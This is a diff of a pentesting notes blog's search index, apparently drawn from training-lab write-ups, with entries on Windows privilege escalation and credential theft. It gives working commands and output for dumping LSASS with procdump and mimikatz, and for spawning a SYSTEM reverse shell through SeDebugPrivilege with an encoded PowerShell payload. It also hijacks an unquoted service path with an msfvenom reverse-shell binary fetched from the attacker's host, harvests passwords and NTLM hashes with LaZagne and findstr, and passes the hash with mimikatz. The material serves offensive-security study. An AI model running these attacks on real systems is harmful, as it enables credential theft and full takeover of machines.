+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>Credential-Hunting</tag>
+        <tag>DPAPI</tag>
+        <tag>Registry</tag>
+        <tag>KeePass</tag>
+        <tag>mRemoteNG</tag>
+        <tag>SharpChrome</tag>
+        <tag>HiveNightmare</tag>
+        <tag>PowerShell-History</tag>
+        <tag>Windows-Vaults</tag>
+        <tag>Browser-Credentials</tag>
       </tags>
   </entry>
   <entry>
@@ -2129,6 +2578,44 @@
       </tags>
   </entry>
   <entry>
+    <title>SeDebugPrivilege</title>
+    <url>/2026/03/06/SeDebugPrivilege/</url>
+    <content><![CDATA[<blockquote>
+<p>To run a particular application or service or assist with troubleshooting, a user might be assigned the <code>SeDebugPrivilege</code> instead of adding the account into the administrators group.</p>
+</blockquote>
+<blockquote>
+<p>Attackers can abuse <code>SeDebugPrivilege</code> by:</p>
+<ul>
+<li>Dumping <code>LSASS</code> memory ( With <code>procdump</code> Or <code>Task Manager</code> )</li>
+<li>Achieving <code>RCE</code> as <code>SYSTEM</code> by interacting with privileged processes.</li>
+</ul>
+</blockquote>
+<h1 id="Dumping-Lsass"><a href="#Dumping-Lsass" class="headerlink" title="Dumping Lsass"></a>Dumping Lsass</h1><h4 id="Dump-LSASS-with-procdump-exe"><a href="#Dump-LSASS-with-procdump-exe" class="headerlink" title="Dump LSASS with procdump.exe"></a>Dump <code>LSASS</code> with <code>procdump.exe</code></h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">Procdump</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span>  </span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Dump-Hashes"><a href="#Dump-Hashes" class="headerlink" title="Dump Hashes"></a>Dump Hashes</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">mimikatz.exe</span> &quot;<span class="title">sekurlsa</span>::<span class="title">minidump</span> <span class="title">lsass.dmp</span>&quot; &quot;<span class="title">sekurlsa</span>::<span class="title">logonpasswords</span>&quot; <span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="RCE-as-SYSTEM"><a href="#RCE-as-SYSTEM" class="headerlink" title="RCE as SYSTEM"></a>RCE as SYSTEM</h1><blockquote>
+<p>SeDebugPrivilege can be abused to achieve remote code execution as SYSTEM by forcing a process running as SYSTEM to spawn a child process that inherits its security token.</p>
+</blockquote>
+<p>Load Module Exploit</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. .\psgetsys.ps1</span><br></pre></td></tr></table></figure>
+
+<p>Run Exploit</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ImpersonateFromParentPid -ppid PID-of-priviliged-process -<span class="built_in">command</span> <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> -cmdargs <span class="string">&quot;/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABqAGUAYwB0ACA &lt; SNIP &gt; BzAGUAKAApAA==&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>Catch Shell As System  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ rlwrap nc -lvnp 443</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>User</category>
+      </categories>
+  </entry>
+  <entry>
     <title>RDP Exploitation</title>
     <url>/2025/12/04/RDP-Exploitation/</url>
     <content><![CDATA[<h1 id="Password-Spray"><a href="#Password-Spray" class="headerlink" title="Password Spray"></a>Password Spray</h1><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L usernames.txt -p <span class="string">&#x27;Pwd&#x27;</span> ip rdp</span><br></pre></td></tr></table></figure>
@@ -2170,44 +2657,6 @@
         <tag>Crowbar</tag>
         <tag>Hydra</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>SeDebugPrivilege</title>
-    <url>/2026/03/06/SeDebugPrivilege/</url>
-    <content><![CDATA[<blockquote>
-<p>To run a particular application or service or assist with troubleshooting, a user might be assigned the <code>SeDebugPrivilege</code> instead of adding the account into the administrators group.</p>
-</blockquote>
-<blockquote>
-<p>Attackers can abuse <code>SeDebugPrivilege</code> by:</p>
-<ul>
-<li>Dumping <code>LSASS</code> memory ( With <code>procdump</code> Or <code>Task Manager</code> )</li>
-<li>Achieving <code>RCE</code> as <code>SYSTEM</code> by interacting with privileged processes.</li>
-</ul>
-</blockquote>
-<h1 id="Dumping-Lsass"><a href="#Dumping-Lsass" class="headerlink" title="Dumping Lsass"></a>Dumping Lsass</h1><h4 id="Dump-LSASS-with-procdump-exe"><a href="#Dump-LSASS-with-procdump-exe" class="headerlink" title="Dump LSASS with procdump.exe"></a>Dump <code>LSASS</code> with <code>procdump.exe</code></h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">Procdump</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span>  </span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Dump-Hashes"><a href="#Dump-Hashes" class="headerlink" title="Dump Hashes"></a>Dump Hashes</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">mimikatz.exe</span> &quot;<span class="title">sekurlsa</span>::<span class="title">minidump</span> <span class="title">lsass.dmp</span>&quot; &quot;<span class="title">sekurlsa</span>::<span class="title">logonpasswords</span>&quot; <span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="RCE-as-SYSTEM"><a href="#RCE-as-SYSTEM" class="headerlink" title="RCE as SYSTEM"></a>RCE as SYSTEM</h1><blockquote>
-<p>SeDebugPrivilege can be abused to achieve remote code execution as SYSTEM by forcing a process running as SYSTEM to spawn a child process that inherits its security token.</p>
-</blockquote>
-<p>Load Module Exploit</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. .\psgetsys.ps1</span><br></pre></td></tr></table></figure>
-
-<p>Run Exploit</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ImpersonateFromParentPid -ppid PID-of-priviliged-process -<span class="built_in">command</span> <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> -cmdargs <span class="string">&quot;/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABqAGUAYwB0ACA &lt; SNIP &gt; BzAGUAKAApAA==&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>Catch Shell As System  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ rlwrap nc -lvnp 443</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>User</category>
-      </categories>
   </entry>
   <entry>
     <title>SeImpersonate and SeAssignPrimaryToken</title>
@@ -2302,73 +2751,6 @@
         <category>Windows Privesc</category>
         <category>User</category>
       </categories>
-  </entry>
-  <entry>
-    <title>Unquoted Service Path</title>
-    <url>/2026/06/16/Unquoted-Service-Path/</url>
-    <content><![CDATA[<p> &gt;➜ Unquoted Service Path occurs when a service binary path contains spaces and is not enclosed in quotes, causing Windows to search and execute executables in unintended locations. If an attacker can place a malicious executable in one of these searched paths, they can hijack the service and execute code with the service’s privileges, such as SYSTEM.<br> &gt;<br> &gt;➜ Example :<br> &gt;<br> &gt;➜ If the service binary path is :</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</span><br></pre></td></tr></table></figure>
-
-<p> &gt;➜ Windows will attempt to execute the following paths in order :<br> &gt;<br> &gt; - <code>C:\Program.exe</code><br> &gt; - <code>C:\Program Files.exe</code><br> &gt; - <code>C:\Program Files (x86)\System.exe</code><br> &gt; - <code>C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</code></p>
-<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerate-Unquoted-Service-Paths"><a href="#Enumerate-Unquoted-Service-Paths" class="headerlink" title="Enumerate Unquoted Service Paths"></a>Enumerate Unquoted Service Paths</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">htb</span>-<span class="title">student</span>&gt;<span class="title">wmic</span> <span class="title">service</span> <span class="title">get</span> <span class="title">name</span>,<span class="title">displayname</span>,<span class="title">startname</span>,<span class="title">pathname</span>,<span class="title">startmode</span> | <span class="title">findstr</span> /<span class="title">i</span> &quot;<span class="title">auto</span>&quot; | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">v</span> &quot;<span class="title">c</span>:\<span class="title">windows</span>\\&quot; | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">v</span> &quot;\&quot;&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">GVFS.Service</span>          <span class="title">GVFS.Service</span>                 <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">GVFS</span>\<span class="title">GVFS.Service.exe</span>                  <span class="title">Auto</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Explorer</span> <span class="title">Service</span>   <span class="title">SystemExplorerHelpService</span>  <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">System</span> <span class="title">Explorer</span>\<span class="title">service</span>\<span class="title">SystemExplorerService64.exe</span>      </span></span><br><span class="line"><span class="function"><span class="title">Auto</span></span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> Win32_Service |</span><br><span class="line"><span class="built_in">Where-Object</span> &#123;</span><br><span class="line">    <span class="variable">$_</span>.StartMode <span class="operator">-eq</span> <span class="string">&#x27;Auto&#x27;</span> <span class="operator">-and</span></span><br><span class="line">    <span class="variable">$_</span>.PathName <span class="operator">-notlike</span> <span class="string">&#x27;C:\Windows*&#x27;</span> <span class="operator">-and</span></span><br><span class="line">    <span class="variable">$_</span>.PathName <span class="operator">-match</span> <span class="string">&#x27; &#x27;</span> <span class="operator">-and</span></span><br><span class="line">    <span class="variable">$_</span>.PathName <span class="operator">-notmatch</span> <span class="string">&#x27;^&quot;&#x27;</span></span><br><span class="line">&#125; |</span><br><span class="line"><span class="built_in">Select</span> Name, DisplayName, StartName, PathName</span><br><span class="line"></span><br><span class="line">GVFS.Service          GVFS.Service                 C:\Program Files\GVFS\GVFS.Service.exe                  Auto</span><br><span class="line"></span><br><span class="line">System Explorer Service   SystemExplorerHelpService  C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe      </span><br><span class="line">Auto</span><br></pre></td></tr></table></figure>
-
-
-<p> &gt;➜ As we can see, these two services have unquoted service paths and may be vulnerable to privilege escalation if writable directories are present.</p>
-<h4 id="Checking-Directory-Permissions"><a href="#Checking-Directory-Permissions" class="headerlink" title="Checking Directory Permissions"></a>Checking Directory Permissions</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\System Explorer\service\&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\                              BUILTIN\Users:(I)(RX)</span><br><span class="line">                                                     Everyone:(I)(RX)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\System Explorer&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\                              BUILTIN\Users:(I)(RX)</span><br><span class="line">                                                     Everyone:(I)(RX)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\                              BUILTIN\Users:(I)(F)</span><br><span class="line">                                                     Everyone:(I)(F)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>➜ We have write permission on <code>C:\Program Files (x86)\</code>, allowing us to place a malicious executable in this directory.</p>
-</blockquote>
-<h1 id="Exploiting-the-Unquoted-Service-Path"><a href="#Exploiting-the-Unquoted-Service-Path" class="headerlink" title="Exploiting the Unquoted Service Path"></a>Exploiting the Unquoted Service Path</h1><blockquote>
-<p>Create malicious binary</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-permissions msfvenom -p windows/shell_reverse_tcp LHOST=Our-IP LPORT=Listening-Port -f exe &gt; System.exe</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Transfer binary to target</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wget</span> http://Our<span class="literal">-IP</span>:port/System.exe <span class="literal">-O</span> <span class="string">&quot;C:\Program Files (x86)\System.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Restart the service</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sc.exe stop SystemExplorerHelpService</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sc.exe <span class="built_in">start</span> SystemExplorerHelpService</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Get Reverse Shell</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-permissions rlwrap nc -lvnp 8888</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>Services</category>
-      </categories>
-      <tags>
-        <tag>wmic</tag>
-        <tag>msfvenom</tag>
-        <tag>icacls</tag>
-        <tag>Windows-Services</tag>
-        <tag>Unquoted-Service-Path</tag>
-        <tag>Service-Hijacking</tag>
-        <tag>Weak-Permissions</tag>
-      </tags>
   </entry>
   <entry>
     <title>Server Operators</title>
@@ -2497,6 +2879,73 @@
       </tags>
   </entry>
   <entry>
+    <title>Unquoted Service Path</title>
+    <url>/2026/06/16/Unquoted-Service-Path/</url>
+    <content><![CDATA[<p> &gt;➜ Unquoted Service Path occurs when a service binary path contains spaces and is not enclosed in quotes, causing Windows to search and execute executables in unintended locations. If an attacker can place a malicious executable in one of these searched paths, they can hijack the service and execute code with the service’s privileges, such as SYSTEM.<br> &gt;<br> &gt;➜ Example :<br> &gt;<br> &gt;➜ If the service binary path is :</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</span><br></pre></td></tr></table></figure>
+
+<p> &gt;➜ Windows will attempt to execute the following paths in order :<br> &gt;<br> &gt; - <code>C:\Program.exe</code><br> &gt; - <code>C:\Program Files.exe</code><br> &gt; - <code>C:\Program Files (x86)\System.exe</code><br> &gt; - <code>C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</code></p>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerate-Unquoted-Service-Paths"><a href="#Enumerate-Unquoted-Service-Paths" class="headerlink" title="Enumerate Unquoted Service Paths"></a>Enumerate Unquoted Service Paths</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">htb</span>-<span class="title">student</span>&gt;<span class="title">wmic</span> <span class="title">service</span> <span class="title">get</span> <span class="title">name</span>,<span class="title">displayname</span>,<span class="title">startname</span>,<span class="title">pathname</span>,<span class="title">startmode</span> | <span class="title">findstr</span> /<span class="title">i</span> &quot;<span class="title">auto</span>&quot; | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">v</span> &quot;<span class="title">c</span>:\<span class="title">windows</span>\\&quot; | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">v</span> &quot;\&quot;&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">GVFS.Service</span>          <span class="title">GVFS.Service</span>                 <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">GVFS</span>\<span class="title">GVFS.Service.exe</span>                  <span class="title">Auto</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Explorer</span> <span class="title">Service</span>   <span class="title">SystemExplorerHelpService</span>  <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">System</span> <span class="title">Explorer</span>\<span class="title">service</span>\<span class="title">SystemExplorerService64.exe</span>      </span></span><br><span class="line"><span class="function"><span class="title">Auto</span></span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> Win32_Service |</span><br><span class="line"><span class="built_in">Where-Object</span> &#123;</span><br><span class="line">    <span class="variable">$_</span>.StartMode <span class="operator">-eq</span> <span class="string">&#x27;Auto&#x27;</span> <span class="operator">-and</span></span><br><span class="line">    <span class="variable">$_</span>.PathName <span class="operator">-notlike</span> <span class="string">&#x27;C:\Windows*&#x27;</span> <span class="operator">-and</span></span><br><span class="line">    <span class="variable">$_</span>.PathName <span class="operator">-match</span> <span class="string">&#x27; &#x27;</span> <span class="operator">-and</span></span><br><span class="line">    <span class="variable">$_</span>.PathName <span class="operator">-notmatch</span> <span class="string">&#x27;^&quot;&#x27;</span></span><br><span class="line">&#125; |</span><br><span class="line"><span class="built_in">Select</span> Name, DisplayName, StartName, PathName</span><br><span class="line"></span><br><span class="line">GVFS.Service          GVFS.Service                 C:\Program Files\GVFS\GVFS.Service.exe                  Auto</span><br><span class="line"></span><br><span class="line">System Explorer Service   SystemExplorerHelpService  C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe      </span><br><span class="line">Auto</span><br></pre></td></tr></table></figure>
+
+
+<p> &gt;➜ As we can see, these two services have unquoted service paths and may be vulnerable to privilege escalation if writable directories are present.</p>
+<h4 id="Checking-Directory-Permissions"><a href="#Checking-Directory-Permissions" class="headerlink" title="Checking Directory Permissions"></a>Checking Directory Permissions</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\System Explorer\service\&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\                              BUILTIN\Users:(I)(RX)</span><br><span class="line">                                                     Everyone:(I)(RX)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\System Explorer&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\                              BUILTIN\Users:(I)(RX)</span><br><span class="line">                                                     Everyone:(I)(RX)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\                              BUILTIN\Users:(I)(F)</span><br><span class="line">                                                     Everyone:(I)(F)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>➜ We have write permission on <code>C:\Program Files (x86)\</code>, allowing us to place a malicious executable in this directory.</p>
+</blockquote>
+<h1 id="Exploiting-the-Unquoted-Service-Path"><a href="#Exploiting-the-Unquoted-Service-Path" class="headerlink" title="Exploiting the Unquoted Service Path"></a>Exploiting the Unquoted Service Path</h1><blockquote>
+<p>Create malicious binary</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-permissions msfvenom -p windows/shell_reverse_tcp LHOST=Our-IP LPORT=Listening-Port -f exe &gt; System.exe</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Transfer binary to target</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wget</span> http://Our<span class="literal">-IP</span>:port/System.exe <span class="literal">-O</span> <span class="string">&quot;C:\Program Files (x86)\System.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Restart the service</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sc.exe stop SystemExplorerHelpService</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sc.exe <span class="built_in">start</span> SystemExplorerHelpService</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Get Reverse Shell</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-permissions rlwrap nc -lvnp 8888</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Services</category>
+      </categories>
+      <tags>
+        <tag>wmic</tag>
+        <tag>msfvenom</tag>
+        <tag>icacls</tag>
+        <tag>Windows-Services</tag>
+        <tag>Unquoted-Service-Path</tag>
+        <tag>Service-Hijacking</tag>
+        <tag>Weak-Permissions</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Weak Service Permissions</title>
     <url>/2026/06/16/Weak-Service-Permissions/</url>
     <content><![CDATA[<blockquote>
@@ -2536,157 +2985,6 @@
         <tag>Service-Configuration</tag>
         <tag>SERVICE_ALL_ACCESS</tag>
         <tag>SERVICE_CHANGE_CONFIG</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows Credential Hunting</title>
-    <url>/2025/11/26/Windows-Credential-Hunting/</url>
-    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
-<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
-<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
-<li><code>Passwords in scripts in the SYSVOL share</code></li>
-<li><code>Password in scripts on IT shares</code></li>
-<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
-<li><code>Password in unattend.xml</code></li>
-<li><code>Passwords in the AD user or computer description fields</code></li>
-<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
-<li><code>Found on user systems and shares</code></li>
-<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
-</ul>
-<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
-<ul>
-<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
-<li><code>Application credentials</code></li>
-<li><code>Wifi passwords</code></li>
-<li><code>Chat app passwords</code></li>
-<li><code>Mail client passwords</code></li>
-<li><code>Windows Credential Manager secrets (current user only)</code></li>
-</ul>
-<p>Administrator Access :</p>
-<ul>
-<li><code>LSASS</code></li>
-<li><code>LSA</code></li>
-<li><code>KeePass memory extraction</code></li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>Lazagne</tag>
-        <tag>Search-for-File-Content</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows Pass the Hash (PtH)</title>
-    <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
-    <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:username /NTLM:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>➜ When impersonating a local account, the <code>/domain</code> parameter should be set to <code>localhost</code> or simply <code>.</code></p>
